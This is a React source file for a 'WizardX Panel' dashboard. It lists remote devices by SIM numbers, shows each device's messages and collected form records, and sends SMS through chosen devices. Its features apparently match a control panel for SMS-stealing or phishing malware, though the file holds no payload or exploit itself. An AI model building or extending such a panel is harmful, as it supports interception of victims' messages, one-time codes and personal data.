import React, { useState, useEffect } from 'react';
import { AuthProvider, useAuth } from './context/AuthContext';
import { Device, Message, FormRecord, AppSettings } from './types';
import {
  fetchDevices,
  fetchMessages,
  fetchFormRecords,
  fetchAppSettings,
} from './services/firestoreService';
import { Header } from './components/Header';
import { SearchBar } from './components/SearchBar';
import { DeviceCard } from './components/DeviceCard';
import { MessagesView } from './components/MessagesView';
import { FormDataModal } from './components/FormDataModal';
import { SettingsMenuModal } from './components/SettingsMenuModal';
import { SimActivationModal } from './components/SimActivationModal';
import { SendSmsModal } from './components/SendSmsModal';
import { FirebaseStatusModal } from './components/FirebaseStatusModal';
import { LoginView } from './components/LoginView';
import { Plus, RefreshCw } from 'lucide-react';

function DashboardContent() {
  const { currentUser, loading } = useAuth();

  // App State
  const [devices, setDevices] = useState<Device[]>([]);
  const [messages, setMessages] = useState<Message[]>([]);
  const [oldMessages, setOldMessages] = useState<Message[]>([]);
  const [formRecords, setFormRecords] = useState<FormRecord[]>([]);
  const [appSettings, setAppSettings] = useState<AppSettings | null>(null);
  const [isDataLoading, setIsDataLoading] = useState(true);

  // Search & Navigation
  const [searchTerm, setSearchTerm] = useState('');
  const [currentView, setCurrentView] = useState<'dashboard' | 'messages' | 'oldMessages'>('dashboard');
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);

  // Modals
  const [isFormDataOpen, setIsFormDataOpen] = useState(false);
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [isSimModalOpen, setIsSimModalOpen] = useState(false);
  const [isSendSmsOpen, setIsSendSmsOpen] = useState(false);
  const [isFirebaseStatusOpen, setIsFirebaseStatusOpen] = useState(false);
  const [activeModalDevice, setActiveModalDevice] = useState<Device | null>(null);

  // Mobile Frame Simulation vs Full Desktop Toggle
  const [isMobileFrame, setIsMobileFrame] = useState(true);

  const loadData = async () => {
    setIsDataLoading(true);
    try {
      const [devs, msgs, oldMsgs, forms, settings] = await Promise.all([
        fetchDevices(),
        fetchMessages(undefined, false),
        fetchMessages(undefined, true),
        fetchFormRecords(),
        fetchAppSettings(),
      ]);
      setDevices(devs);
      setMessages(msgs);
      setOldMessages(oldMsgs);
      setFormRecords(forms);
      setAppSettings(settings);
    } catch (err) {
      console.error('Error loading panel data:', err);
    } finally {
      setIsDataLoading(false);
    }
  };

  useEffect(() => {
    loadData();
  }, []);

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#F7F8FC]">
        <div className="flex flex-col items-center space-y-3">
          <div className="w-10 h-10 border-4 border-[#315FEA] border-t-transparent rounded-full animate-spin"></div>
          <span className="text-xs font-semibold text-gray-500">Initializing WizardX Panel...</span>
        </div>
      </div>
    );
  }

  if (!currentUser) {
    return <LoginView />;
  }

  // Filter devices based on search
  const filteredDevices = devices.filter((d) => {
    if (!searchTerm.trim()) return true;
    const term = searchTerm.toLowerCase().trim();
    return (
      d.deviceId.toLowerCase().includes(term) ||
      d.displayName.toLowerCase().includes(term) ||
      d.connectionStatus.toLowerCase().includes(term) ||
      d.sim1Number.toLowerCase().includes(term) ||
      (d.sim2Number && d.sim2Number.toLowerCase().includes(term))
    );
  });

  // Action handlers
  const handleOpenMessages = (device: Device) => {
    setSelectedDevice(device);
    setCurrentView('messages');
  };

  const handleOpenOldMessages = (device: Device) => {
    setSelectedDevice(device);
    setCurrentView('oldMessages');
  };

  const handleOpenSendSms = (device?: Device) => {
    const target = device || selectedDevice || devices[0];
    setActiveModalDevice(target);
    setIsSendSmsOpen(true);
  };

  const handleOpenSimActions = (device: Device) => {
    setActiveModalDevice(device);
    setIsSimModalOpen(true);
  };

  const handleDeviceUpdated = (updated: Device) => {
    setDevices((prev) => prev.map((d) => (d.id === updated.id ? updated : d)));
  };

  const handleMessageSent = (newMsg: Message) => {
    setMessages((prev) => [newMsg, ...prev]);
  };

  // Messages to show in message view
  const currentViewMessages = (currentView === 'oldMessages' ? oldMessages : messages).filter(
    (m) => !selectedDevice || m.deviceId === selectedDevice.deviceId
  );

  // Form records for current device or all
  const filteredFormRecords = formRecords.filter(
    (f) => !selectedDevice || f.deviceId === selectedDevice.deviceId
  );

  return (
    <div className="min-h-screen bg-[#F0F2F6] flex flex-col items-center justify-start p-2 sm:p-4 lg:p-6 select-none font-sans">
      {/* Outer wrapper: adapts to Mobile Frame or Full Responsive view */}
      <div
        className={`w-full transition-all duration-300 ${
          isMobileFrame
            ? 'max-w-[420px] bg-[#F7F8FC] rounded-[36px] shadow-[0_12px_45px_rgba(0,0,0,0.12)] border-[6px] border-[#1F1F1F] p-3 sm:p-4 my-auto min-h-[840px] flex flex-col relative'
            : 'max-w-4xl bg-[#F7F8FC] rounded-3xl shadow-sm border border-gray-200/80 p-4 sm:p-6'
        }`}
      >
        {/* Mobile speaker notch indicator (only when in mobile frame mode) */}
        {isMobileFrame && (
          <div className="w-24 h-4 bg-[#1F1F1F] rounded-full mx-auto -mt-2 mb-3 flex items-center justify-center shrink-0">
            <div className="w-10 h-1 bg-[#333333] rounded-full"></div>
          </div>
        )}

        {/* Dashboard View */}
        {currentView === 'dashboard' && (
          <>
            <Header
              deviceCount={361} // Live total matching screenshot badge (361)
              title={appSettings?.appName || '• WizardX Panel •'}
              onHomeClick={() => setCurrentView('dashboard')}
              onSettingsClick={() => setIsSettingsOpen(true)}
              onQuickSmsClick={() => handleOpenSendSms()}
              onFirebaseStatusClick={() => setIsFirebaseStatusOpen(true)}
              isMobileFrame={isMobileFrame}
              toggleMobileFrame={() => setIsMobileFrame(!isMobileFrame)}
            />

            {/* Search Input */}
            <SearchBar
              searchTerm={searchTerm}
              onSearchChange={setSearchTerm}
              placeholder="Enter Number To Seach"
            />

            {/* Devices List */}
            <div className="flex-1 overflow-y-auto pr-0.5">
              {isDataLoading ? (
                <div className="py-12 text-center">
                  <div className="w-8 h-8 border-3 border-[#315FEA] border-t-transparent rounded-full animate-spin mx-auto mb-2"></div>
                  <p className="text-xs text-gray-400">Loading authorized devices...</p>
                </div>
              ) : filteredDevices.length === 0 ? (
                <div className="bg-white rounded-[22px] p-8 text-center border border-gray-100 shadow-sm my-4">
                  <p className="text-sm font-semibold text-gray-700">No matching devices</p>
                  <p className="text-xs text-gray-400 mt-1">
                    Try searching with another device ID or phone number.
                  </p>
                  <button
                    onClick={() => setSearchTerm('')}
                    className="mt-3 text-xs font-semibold text-[#315FEA] hover:underline"
                  >
                    Clear Search
                  </button>
                </div>
              ) : (
                <div className="space-y-0.5">
                  {filteredDevices.map((device) => (
                    <DeviceCard
                      key={device.id}
                      device={device}
                      onViewMessages={handleOpenMessages}
                      onViewOldMessages={handleOpenOldMessages}
                      onOpenSendSms={handleOpenSendSms}
                      onOpenSimActions={handleOpenSimActions}
                      onCardActionMenu={handleOpenSimActions}
                    />
                  ))}
                </div>
              )}
            </div>

            {/* Refresh / Device Count Footer */}
            <div className="mt-3 pt-2 border-t border-gray-200/60 flex items-center justify-between text-xs text-gray-400">
              <span className="font-medium">
                Showing {filteredDevices.length} of {devices.length} authorized devices
              </span>
              <button
                onClick={loadData}
                className="flex items-center space-x-1 hover:text-[#315FEA] transition-colors"
                title="Sync state"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${isDataLoading ? 'animate-spin' : ''}`} />
                <span>Sync</span>
              </button>
            </div>
          </>
        )}

        {/* Messages / Old Messages View */}
        {(currentView === 'messages' || currentView === 'oldMessages') && (
          <div className="flex-1 flex flex-col overflow-y-auto">
            <MessagesView
              device={selectedDevice}
              messages={currentViewMessages}
              isOldMessages={currentView === 'oldMessages'}
              onBack={() => setCurrentView('dashboard')}
              onShowFormData={() => setIsFormDataOpen(true)}
              onOpenSendSms={() => handleOpenSendSms(selectedDevice || undefined)}
              onOpenSettings={() => setIsSettingsOpen(true)}
            />
          </div>
        )}

        {/* Mobile home bar indicator */}
        {isMobileFrame && (
          <div className="w-28 h-1 bg-gray-300 rounded-full mx-auto mt-3 shrink-0"></div>
        )}
      </div>

      {/* Modals */}
      <FormDataModal
        isOpen={isFormDataOpen}
        onClose={() => setIsFormDataOpen(false)}
        records={filteredFormRecords.length > 0 ? filteredFormRecords : formRecords}
      />

      <SettingsMenuModal
        isOpen={isSettingsOpen}
        onClose={() => setIsSettingsOpen(false)}
        userId="id41"
      />

      <SimActivationModal
        isOpen={isSimModalOpen}
        onClose={() => setIsSimModalOpen(false)}
        device={activeModalDevice}
        onDeviceUpdated={handleDeviceUpdated}
      />

      <SendSmsModal
        isOpen={isSendSmsOpen}
        onClose={() => setIsSendSmsOpen(false)}
        device={activeModalDevice || devices[0]}
        onMessageSent={handleMessageSent}
      />

      <FirebaseStatusModal
        isOpen={isFirebaseStatusOpen}
        onClose={() => setIsFirebaseStatusOpen(false)}
        deviceCount={devices.length}
        messageCount={messages.length + oldMessages.length}
      />
    </div>
  );
}

export default function App() {
  return (
    <AuthProvider>
      <DashboardContent />
    </AuthProvider>
  );
}
